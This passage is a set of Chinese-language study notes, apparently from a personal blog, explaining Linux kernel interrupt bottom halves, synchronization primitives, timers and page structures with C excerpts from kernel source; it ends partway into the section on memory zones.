<img src="/2022/08/18/Linux%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/1655523602992-1661853278302.png" class width="1655523602992"> 
<h2 id="中断处理"><a href="#中断处理" class="headerlink" title="中断处理"></a>中断处理</h2><p>为了提高CPU和外围硬件（硬盘，键盘，鼠标等等）之间协同工作的性能，引入了中断的机制，中断机制是硬件在需要的时候向CPU发出信号，CPU暂时停止正在进行的工作，来处理硬件请求的一种机制</p>
<ul>
<li>异步中断（一般由硬件引起）：CPU 处理中断的时间过长，所以先将硬件复位，使硬件可以继续自己的工作，然后在适当时候处理中断请求中耗时的部分</li>
<li>同步中断：CPU 处理完中断请求的所有工作后才反馈硬件 </li>
</ul>
<p>为了在中断执行时间尽可能短和中断处理需完成大量工作之间找到一个平衡点，Linux 将中断处理程序分解为两个半部：顶半部（top half）和底半部（bottom half）：</p>
<ul>
<li>顶半部完成尽可能少的比较紧急的功能，它往往只是 <strong>简单地读取寄存器中的中断状态并清除中断标志后就进行“登记中断”的工作</strong>（“登记中断”：将底半部处理程序挂到该设备的执行队列中去），这样，顶半部执行的速度就会很快，可以服务更多的中断请求</li>
<li>现在，中断处理工作的重心就落在了底半部的头上，<strong>底半部负责执行中断处理程序</strong>，它来完成中断事件的绝大多数任务，而且可以被新的中断打断</li>
<li>顶半部往往被设计成不可中断，底半部则相对来说并不是非常紧急的，而且相对比较耗时，不在硬件中断服务程序中执行，所以可以打断</li>
</ul>
<p>简单来说就是：</p>
<ul>
<li>顶半部：登记中断，把底半部处理程序挂到该设备的执行队列中，不可中断</li>
<li>底半部：负责中断处理程序的具体实现，可中断</li>
</ul>
<img src="/2022/08/18/Linux%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/1660878766425-1661853278313.png" class width="1660878766425"> 
<p>实现底半部的方法很多，目前使用最多的是以下3中方法：</p>
<ul>
<li>软中断</li>
<li>tasklet</li>
<li>工作队列</li>
</ul>
<p><strong>软中断</strong></p>
<p>软中断的流程如下： </p>
<img src="/2022/08/18/Linux%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/1660879056533-1661853278313.png" class width="1660879056533"> 
<p>注册软中断的函数 open_softirq：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">open_softirq</span><span class="params">(<span class="keyword">int</span> nr, <span class="keyword">void</span> (*action)(struct softirq_action *))</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    softirq_vec[nr].action = action; <span class="comment">/* softirq_vec是个struct softirq_action类型的数组 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><p>将软中断类型和软中断处理函数加入到软中断序列中：</p>
<ul>
<li><p>@nr - 软中断类型</p>
<ul>
<li>@(<em>action)(struct softirq_action </em>) - 软中断处理的函数指针</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>结构体 softirq_action 如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">softirq_action</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">void</span>    (*action)(struct softirq_action *);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>这个结构体的字段是个函数指针，字段名称是 action</li>
<li>函数指针的参数是 struct softirq_action 的地址，其实就是指向 softirq_vec 中的某一项：<ul>
<li>如果 open_softirq 是这样调用的：<code>open_softirq(NET_TX_SOFTIRQ, my_tx_action)</code></li>
<li>那么 my_tx_action 的参数就是：<code>softirq_vec[NET_TX_SOFTIRQ]</code> 的地址</li>
</ul>
</li>
</ul>
<p>触发软中断的函数 raise_softirq：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">raise_softirq</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> nr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> flags;</span><br><span class="line"></span><br><span class="line">    local_irq_save(flags); <span class="comment">/* 保存寄存器 */</span></span><br><span class="line">    raise_softirq_irqoff(nr); <span class="comment">/* 触发软中断 */</span></span><br><span class="line">    local_irq_restore(flags); <span class="comment">/* 恢复寄存器 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>触发某个中断类型的软中断：<ul>
<li>@nr - 被触发的中断类型</li>
</ul>
</li>
</ul>
<p>执行软中断的函数 do_softirq：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">asmlinkage <span class="keyword">void</span> <span class="title">do_softirq</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __u32 pending;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> flags;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 判断是否在中断处理中，如果正在中断处理，就直接返回 */</span></span><br><span class="line">    <span class="keyword">if</span> (in_interrupt())</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 保存当前寄存器的值 */</span></span><br><span class="line">    local_irq_save(flags);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 取得当前已注册软中断的位图 */</span></span><br><span class="line">    pending = local_softirq_pending();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 循环处理所有已注册的软中断 */</span></span><br><span class="line">    <span class="keyword">if</span> (pending)</span><br><span class="line">        __do_softirq();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 恢复寄存器的值到中断处理前 */</span></span><br><span class="line">    local_irq_restore(flags);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>tasklet</strong></p>
<p>tasklet 也是利用软中断来实现的，但是它提供了比软中断更好用的接口（其实就是基于软中断又封装了一下）</p>
<ul>
<li>所以除了对性能要求特别高的情况，一般建议使用 tasklet 来实现自己的中断</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tasklet_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tasklet_struct</span> *<span class="title">next</span>;</span> <span class="comment">/* 链表中的下一个tasklet */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> state;         <span class="comment">/* tasklet状态 */</span></span><br><span class="line">    <span class="keyword">atomic_t</span> count;              <span class="comment">/* 引用计数器 */</span></span><br><span class="line">    <span class="keyword">void</span> (*func)(<span class="keyword">unsigned</span> <span class="keyword">long</span>); <span class="comment">/* tasklet处理函数 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> data;          <span class="comment">/* tasklet处理函数的参数 */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>工作队列</strong></p>
<p>工作队列子系统是一个 <strong>用于创建内核线程的接口</strong> ，通过它可以创建一个 [工作者线程] 来专门处理中断的下半部工作</p>
<ul>
<li>工作队列和 tasklet 不一样，不是基于软中断来实现的</li>
</ul>
<img src="/2022/08/18/Linux%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/1660882969270-1661853278313.png" class width="1660882969270"> 
<p>工作队列主要用到下面3个结构体，弄懂了这3个结构体的关系，也就知道工作队列的处理流程了：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 在include/linux/workqueue.h文件中定义 */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">atomic_long_t</span> data;             <span class="comment">/* 这个并不是处理函数的参数,而是表示此work是否pending等状态的flag */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WORK_STRUCT_PENDING 0        <span class="comment">/* T if work item pending execution */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WORK_STRUCT_FLAG_MASK (3UL)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WORK_STRUCT_WQ_DATA_MASK (~WORK_STRUCT_FLAG_MASK)</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">entry</span>;</span>         <span class="comment">/* 中断下半部处理函数的链表 */</span></span><br><span class="line">    <span class="keyword">work_func_t</span> func;               <span class="comment">/* 处理中断下半部工作的函数 */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_LOCKDEP</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">lockdep_map</span> <span class="title">lockdep_map</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 在kernel/workqueue.c文件中定义</span></span><br><span class="line"><span class="comment"> * 每个工作者线程对应一个cpu_workqueue_struct,其中包含要处理的工作的链表</span></span><br><span class="line"><span class="comment"> * (即work_struct的链表,当此链表不空时,唤醒工作者线程来进行处理)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cpu_workqueue_struct</span> &#123;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">spinlock_t</span> lock;                   <span class="comment">/* 锁保护这种结构 */</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">worklist</span>;</span>         <span class="comment">/* 工作队列头节点 */</span></span><br><span class="line">    <span class="keyword">wait_queue_head_t</span> more_work;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> *<span class="title">current_work</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">workqueue_struct</span> *<span class="title">wq</span>;</span>       <span class="comment">/* 关联工作队列结构 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">thread</span>;</span>        <span class="comment">/* 关联线程 */</span></span><br><span class="line">&#125; ____cacheline_aligned;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 也是在kernel/workqueue.c文件中定义的</span></span><br><span class="line"><span class="comment"> * 每个workqueue_struct表示一种工作者类型,系统默认的就是events工作者类型</span></span><br><span class="line"><span class="comment"> * 每个工作者类型一般对应n个工作者线程,n就是处理器的个数</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">workqueue_struct</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">cpu_workqueue_struct</span> *<span class="title">cpu_wq</span>;</span>  <span class="comment">/* 工作者线程 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *name;</span><br><span class="line">    <span class="keyword">int</span> singlethread;</span><br><span class="line">    <span class="keyword">int</span> freezeable;        <span class="comment">/* Freeze threads during suspend */</span></span><br><span class="line">    <span class="keyword">int</span> rt;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_LOCKDEP</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">lockdep_map</span> <span class="title">lockdep_map</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="内核同步"><a href="#内核同步" class="headerlink" title="内核同步"></a>内核同步</h2><p>存在共享资源（共享一个文件，一块内存等等）的时候，为了防止并发访问时共享资源的数据不一致，引入了同步机制</p>
<p>所谓同步，其实防止在临界区中形成竞争条件：</p>
<ul>
<li>临界区 - 也称为临界段，就是访问和操作共享数据的代码段</li>
<li>竞争条件 - 2个或2个以上线程在临界区里同时执行的时候，就构成了竞争条件</li>
</ul>
<p>内核同步常见方法如下：</p>
<p><strong>原子操作</strong></p>
<p>原子操作是由编译器来保证的，保证一个线程对数据的操作不会被其他线程打断</p>
<ul>
<li>所谓原子操作是指不会被线程调度机制打断的操作，这种操作一旦开始，就一直运行到结束，中间不会有任何 context switch</li>
</ul>
<p><strong>加锁</strong></p>
<p>为了给临界区加锁，保证临界区数据的同步，首先了解一下内核中哪些情况下会产生并发 </p>
<p>内核中造成竞争条件的原因：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th><strong>竞争原因</strong></th>
<th><strong>说明</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>中断</td>
<td>中断随时会发生，也就会随时打断当前执行的代码，如果中断和被打断的代码在相同的临界区，就产生了竞争条件</td>
</tr>
<tr>
<td>软中断和tasklet</td>
<td>软中断和 tasklet 也会随时被内核唤醒执行，也会像中断一样打断正在执行的代码</td>
</tr>
<tr>
<td>内核抢占</td>
<td>内核具有抢占性，发生抢占时，如果抢占的线程和被抢占的线程在相同的临界区，就产生了竞争条件</td>
</tr>
<tr>
<td>睡眠及用户空间的同步</td>
<td>用户进程睡眠后，调度程序会唤醒一个新的用户进程，新的用户进程和睡眠的进程可能在同一个临界区中</td>
</tr>
<tr>
<td>对称多处理</td>
<td>2个或多个处理器可以同时执行相同的代码</td>
</tr>
</tbody>
</table>
</div>
<p>常见的锁有以下几类：</p>
<ul>
<li>自旋锁：当一个线程获取了锁之后，其他试图获取这个锁的线程一直在循环等待获取这个锁，直至锁重新可用（由于线程实在一直循环的获取这个锁，所以会造成CPU处理时间的浪费，因此最好将自旋锁用于能很快处理完的临界区）</li>
<li>互斥锁：互斥锁也是一种可以睡眠的锁，相当于二值信号量，只是提供的API更加简单，使用的场景也更严格一些 </li>
<li>顺序锁：读锁被获取的情况下，写锁仍然可以被获取</li>
</ul>
<p><strong>信号量</strong></p>
<p>信号量也是一种锁，和自旋锁不同的是，进程获取不到信号量的时候，不会像自旋锁一样循环的去试图获取锁，而是进入睡眠（进入等待队列），直至有信号量释放出来时，才会唤醒睡眠的进程，进入临界区执行</p>
<p>信号量结构体具体如下： </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">semaphore</span> &#123;</span></span><br><span class="line">    <span class="keyword">spinlock_t</span>        lock;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>        count; <span class="comment">/* 信号量计数 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>    <span class="title">wait_list</span>;</span> <span class="comment">/* 等待队列 */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>其实信号量就相当于一个 [常数] 加上一个 [等待队列]：</p>
<ul>
<li>[常数] &gt; 0：代表了当前临界区可以容纳的进程个数</li>
<li>[常数] = 0：争用信号量的进程会进入睡眠（进入等待队列）</li>
<li>[常数] &lt; 0：在等待队列中的进程数目</li>
</ul>
<p>当一个进程进入临界区时，会先检查该临界区的 <code>semaphore-&gt;count</code>：</p>
<ul>
<li>如果大于“0”就进入该临界区，同时 <code>semaphore-&gt;count--</code></li>
<li>如果小于等于“0”就进入 <code>semaphore-&gt;wait_list</code>，同时 <code>semaphore-&gt;count--</code></li>
</ul>
<p>当一个进程离开临界区时，也会检查该临界区的 <code>semaphore-&gt;count</code>：</p>
<ul>
<li>如果小于“0”就把 <code>semaphore-&gt;wait_list</code> 中的一个进程放入临界区，同时 <code>semaphore-&gt;count++</code></li>
<li>如果大于等于“0”，只执行 <code>semaphore-&gt;count++</code> 就可以了</li>
</ul>
<p><strong>完成变量</strong></p>
<p>完成变量的机制类似于信号量，比如一个线程A进入临界区之后，另一个线程B会在完成变量上等待，线程A完成了任务出了临界区之后，使用完成变量来唤醒线程B</p>
<ul>
<li>如果在内核中一个任务需要发出信号通知另一任务发生了某个特定事件，利用完成变量（completion variable）是使两个任务得以同步的简单方法</li>
<li>如果一个任务要执行一些工作时，另一个任务就会在完成变量上等待</li>
</ul>
<p><strong>同步方法选择</strong></p>
<img src="/2022/08/18/Linux%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/1660900515527-1661853278314.png" class width="1660900515527"> 
<h2 id="系统时间"><a href="#系统时间" class="headerlink" title="系统时间"></a>系统时间</h2><p>系统中管理的时间有2种：实际时间和定时器</p>
<ul>
<li>实际时间：现实中钟表上显示的时间，其实内核中并不常用这个时间，主要是用户空间的程序有时需要获取当前时间，所以内核中也管理着这个时间</li>
<li>定时器：内核中主要使用的时间管理方法，通过定时器，可以有效的调度程序的执行 </li>
</ul>
<p><strong>定时器</strong></p>
<p>定时器在内核中用一个链表来保存的，链表的每个节点都是一个定时器 </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">timer_list</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">entry</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> expires;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> (*function)(<span class="keyword">unsigned</span> <span class="keyword">long</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> data;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tvec_base</span> *<span class="title">base</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_TIMER_STATS</span></span><br><span class="line">    <span class="keyword">void</span> *start_site;</span><br><span class="line">    <span class="keyword">char</span> start_comm[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">int</span> start_pid;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_LOCKDEP</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">lockdep_map</span> <span class="title">lockdep_map</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>定时器的使用中，下面2个概念非常重要：</p>
<ul>
<li>HZ：节拍率(HZ)是时钟中断的频率，表示的一秒内时钟中断的次数 </li>
<li>jiffies：jiffies 用来记录自系统启动以来产生的总节拍数，比如系统启动了 N 秒，那么 jiffies 就为 N×HZ </li>
</ul>
<p>一个动态定时器的生命周期中，一般会经过下面的几个步骤： </p>
<img src="/2022/08/18/Linux%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/1661421650964-1661853278313.png" class width="1661421650964"> 
<p><strong>时间中断</strong></p>
<p>时钟中断处理程序作为系统定时器而注册到内核中，体系结构的不同，可能时钟中断处理程序中处理的内容不同，介绍如下：</p>
<ul>
<li>时钟中断是一种硬中断，由时间硬件（系统定时器，一种可编程硬件）产生，CPU处理后交由时间中断处理程序来完成更新系统时间、执行周期性任务等</li>
<li>系结构相关部分被注册到内核中，确保中断产生时能执行，这部分不能有耗时操作，主要是更新时间与调用结构无关部分列程（异步）</li>
<li>已到期的定时器由体系结构无关部分来处理，其它的一些耗时操作，如显示时间的更新也在这一部分</li>
</ul>
<p>但是以下这些基本的工作都会执行：</p>
<ul>
<li>获得 xtime_lock 锁（一种顺序锁），以便对访问 jiffies_64 和墙上时间 xtime 进行保护</li>
<li>需要时应答或重新设置系统时钟</li>
<li>周期性的使用墙上时间更新实时时钟</li>
<li>调用 <code>tick_periodic()</code></li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">tick_periodic</span><span class="params">(<span class="keyword">int</span> cpu)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (tick_do_timer_cpu == cpu) &#123;</span><br><span class="line">        write_seqlock(&amp;xtime_lock);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Keep track of the next tick event */</span></span><br><span class="line">        tick_next_period = ktime_add(tick_next_period, tick_period);</span><br><span class="line"></span><br><span class="line">        do_timer(<span class="number">1</span>);</span><br><span class="line">        write_sequnlock(&amp;xtime_lock);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    update_process_times(user_mode(get_irq_regs()));</span><br><span class="line">    profile_tick(CPU_PROFILING);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>上述场景中，写锁必须要优先于读锁（因为 <strong>xtime</strong> 必须及时更新），而且写锁的使用者很少（一般只有系统定期更新 <strong>xtime</strong> 的线程需要持有这个锁）</li>
<li>这正是 [顺序锁] 的应用场景</li>
</ul>
<h2 id="内存管理"><a href="#内存管理" class="headerlink" title="内存管理"></a>内存管理</h2><p><strong>页</strong></p>
<p>内存最基本的管理单元是页，同时按照内存地址的大小，大致分为3个区，页的大小与体系结构有关，在 x86 结构中一般是 4KB 或者 8KB</p>
<p>可以通过 <code>getconf</code> 命令来查看系统的 page 的大小： </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">➜  桌面 getconf -a | grep -i <span class="string">&#x27;page&#x27;</span></span><br><span class="line">PAGESIZE                           <span class="number">4096</span></span><br><span class="line">PAGE_SIZE                          <span class="number">4096</span></span><br><span class="line">_AVPHYS_PAGES                      <span class="number">514073</span></span><br><span class="line">_PHYS_PAGES                        <span class="number">995803</span></span><br></pre></td></tr></table></figure>
<p>用于描述页的结构体如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> &#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> flags;    <span class="comment">/* 存放页的状态,各种状态参见&lt;linux/page-flags.h&gt; */</span></span><br><span class="line">    <span class="keyword">atomic_t</span> _count;        <span class="comment">/* 页的引用计数 */</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="keyword">atomic_t</span> _mapcount;    <span class="comment">/* 已经映射到mms的pte的个数 */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span>        <span class="comment">/* 用于slab层 */</span></span><br><span class="line">            u16 inuse;</span><br><span class="line">            u16 objects;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">private</span>;        <span class="comment">/* 此page作为私有数据时,指向私有数据 */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">address_space</span> *<span class="title">mapping</span>;</span>    <span class="comment">/* 此page作为页缓存时,指向关联的address_space */</span></span><br><span class="line">        &#125;;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_SPLIT_PTLOCKS</span></span><br><span class="line">        <span class="keyword">spinlock_t</span> ptl;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">slab</span>;</span>    <span class="comment">/* 指向slab层 */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">first_page</span>;</span>    <span class="comment">/* 尾部复合页中的第一个页 */</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="keyword">pgoff_t</span> index;        <span class="comment">/* Our offset within mapping */</span></span><br><span class="line">        <span class="keyword">void</span> *freelist;        <span class="comment">/* SLUB: freelist req slab lock */</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">lru</span>;</span>    <span class="comment">/* 将页关联起来的链表项 */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(WANT_PAGE_VIRTUAL)</span></span><br><span class="line">    <span class="keyword">void</span> *<span class="keyword">virtual</span>;            <span class="comment">/* 页的虚拟地址 */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* WANT_PAGE_VIRTUAL */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_WANT_PAGE_DEBUG_FLAGS</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> debug_flags;    <span class="comment">/* Use atomic bitops on this */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KMEMCHECK</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * kmemcheck wants to track the status of each byte in a page; this</span></span><br><span class="line"><span class="comment">     * is a pointer to such a status block. NULL if not tracked</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">void</span> *shadow;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>区</strong></p>
<p>页是内存管理的最小单元，但是并不是所有的页对于内核都一样</p>
<ul>
